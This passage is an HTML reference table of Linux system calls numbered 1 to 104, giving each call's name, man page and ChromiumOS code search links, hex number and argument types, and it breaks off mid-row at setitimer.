href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td><td align="center">0x01</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">2</td><td>fork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fork">cs/</a></td><td align="center">0x02</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">3</td><td>read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*read">cs/</a></td><td align="center">0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">4</td><td>write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*write">cs/</a></td><td align="center">0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">5</td><td>open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open">cs/</a></td><td align="center">0x05</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">6</td><td>close</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/close.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*close">cs/</a></td><td align="center">0x06</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">7</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x07</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">8</td><td>creat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/creat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*creat">cs/</a></td><td align="center">0x08</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">9</td><td>link</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/link.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*link">cs/</a></td><td align="center">0x09</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">10</td><td>unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlink">cs/</a></td><td align="center">0x0a</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">11</td><td>execve</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td><td align="center">0x0b</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">12</td><td>chdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td><td align="center">0x0c</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">13</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x0d</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">14</td><td>mknod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknod">cs/</a></td><td align="center">0x0e</td><td>const char *filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">15</td><td>chmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chmod">cs/</a></td><td align="center">0x0f</td><td>const char *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">16</td><td>lchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown">cs/</a></td><td align="center">0x10</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">17</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x11</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">18</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x12</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">19</td><td>lseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td><td align="center">0x13</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">20</td><td>getpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td><td align="center">0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">21</td><td>mount</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mount.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mount">cs/</a></td><td align="center">0x15</td><td>char *dev_name</td><td>char *dir_name</td><td>char *type</td><td>unsigned long flags</td><td>void *data</td><td>-</td></tr><tr><td align="center">22</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x16</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">23</td><td>setuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td><td align="center">0x17</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">24</td><td>getuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td><td align="center">0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">25</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x19</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">26</td><td>ptrace</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td><td align="center">0x1a</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td align="center">27</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x1b</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">28</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x1c</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">29</td><td>pause</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pause.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pause">cs/</a></td><td align="center">0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">30</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x1e</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">31</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x1f</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">32</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x20</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">33</td><td>access</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/access.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*access">cs/</a></td><td align="center">0x21</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">34</td><td>nice</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nice.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nice">cs/</a></td><td align="center">0x22</td><td>int increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">35</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x23</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">36</td><td>sync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sync">cs/</a></td><td align="center">0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">37</td><td>kill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td><td align="center">0x25</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">38</td><td>rename</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rename.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rename">cs/</a></td><td align="center">0x26</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">39</td><td>mkdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdir">cs/</a></td><td align="center">0x27</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">40</td><td>rmdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rmdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rmdir">cs/</a></td><td align="center">0x28</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">41</td><td>dup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td><td align="center">0x29</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">42</td><td>pipe</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe">cs/</a></td><td align="center">0x2a</td><td>int *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">43</td><td>times</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td><td align="center">0x2b</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">44</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x2c</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">45</td><td>brk</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td><td align="center">0x2d</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">46</td><td>setgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td><td align="center">0x2e</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">47</td><td>getgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td><td align="center">0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">48</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x30</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">49</td><td>geteuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td><td align="center">0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">50</td><td>getegid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td><td align="center">0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">51</td><td>acct</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/acct.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*acct">cs/</a></td><td align="center">0x33</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">52</td><td>umount2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umount2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umount2">cs/</a></td><td align="center">0x34</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">53</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x35</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">54</td><td>ioctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td><td align="center">0x36</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">55</td><td>fcntl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td><td align="center">0x37</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">56</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x38</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">57</td><td>setpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td><td align="center">0x39</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">58</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x3a</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">59</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x3b</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">60</td><td>umask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td><td align="center">0x3c</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">61</td><td>chroot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chroot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chroot">cs/</a></td><td align="center">0x3d</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">62</td><td>ustat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ustat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ustat">cs/</a></td><td align="center">0x3e</td><td>unsigned dev</td><td>struct ustat *ubuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">63</td><td>dup2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup2">cs/</a></td><td align="center">0x3f</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">64</td><td>getppid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td><td align="center">0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">65</td><td>getpgrp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgrp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgrp">cs/</a></td><td align="center">0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">66</td><td>setsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td><td align="center">0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">67</td><td>sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigaction">cs/</a></td><td align="center">0x43</td><td>int</td><td>const struct old_sigaction *</td><td>struct old_sigaction *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">68</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x44</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">69</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x45</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">70</td><td>setreuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td><td align="center">0x46</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">71</td><td>setregid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td><td align="center">0x47</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">72</td><td>sigsuspend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigsuspend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigsuspend">cs/</a></td><td align="center">0x48</td><td>int unused1</td><td>int unused2</td><td>old_sigset_t mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">73</td><td>sigpending</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sigpending.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sigpending">cs/</a></td><td align="center">0x49</td><td>old_sigset_t *uset</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">74</td><td>sethostname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td><td align="center">0x4a</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">75</td><td>setrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td><td align="center">0x4b</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">76</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x4c</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">77</td><td>getrusage</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td><td align="center">0x4d</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">78</td><td>gettimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td><td align="center">0x4e</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">79</td><td>settimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td><td align="center">0x4f</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">80</td><td>getgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td><td align="center">0x50</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">81</td><td>setgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td><td align="center">0x51</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">82</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x52</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">83</td><td>symlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlink">cs/</a></td><td align="center">0x53</td><td>const char *old</td><td>const char *new</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">84</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x54</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">85</td><td>readlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlink">cs/</a></td><td align="center">0x55</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">86</td><td>uselib</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uselib.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uselib">cs/</a></td><td align="center">0x56</td><td>const char *library</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">87</td><td>swapon</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td><td align="center">0x57</td><td>const char *specialfile</td><td>int swap_flags</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">88</td><td>reboot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td><td align="center">0x58</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td align="center">89</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x59</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">90</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x5a</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">91</td><td>munmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td><td align="center">0x5b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">92</td><td>truncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td><td align="center">0x5c</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">93</td><td>ftruncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td><td align="center">0x5d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">94</td><td>fchmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td><td align="center">0x5e</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">95</td><td>fchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td><td align="center">0x5f</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">96</td><td>getpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td><td align="center">0x60</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">97</td><td>setpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td><td align="center">0x61</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">98</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x62</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">99</td><td>statfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs">cs/</a></td><td align="center">0x63</td><td>const char * path</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">100</td><td>fstatfs</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs">cs/</a></td><td align="center">0x64</td><td>unsigned int fd</td><td>struct statfs *buf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">101</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x65</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">102</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x66</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">103</td><td>syslog</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td><td align="center">0x67</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">104</td><td>setitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td><td align="center">0x68</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval 